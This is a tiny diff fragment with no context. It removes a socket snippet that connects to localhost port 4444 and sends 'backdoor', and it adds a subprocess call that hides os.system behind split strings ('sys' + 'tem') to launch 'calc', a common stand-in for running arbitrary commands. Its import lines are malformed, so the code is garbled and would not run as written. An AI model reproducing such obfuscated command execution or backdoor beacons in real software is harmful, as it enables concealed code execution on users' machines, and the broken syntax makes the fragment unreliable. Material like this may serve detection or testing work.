@@ -1,4 +1,2 @@
-__import__ socket
-s = socket.socket()
-s.connect(('127.0.0.1', 4444))
-s.send(b'backdoor')
+_import_ subprocess
+subprocess.Popen(['python', '-c', 'o = ___import___("o"); getattr(o, "sys" + "tem")("calc")'])
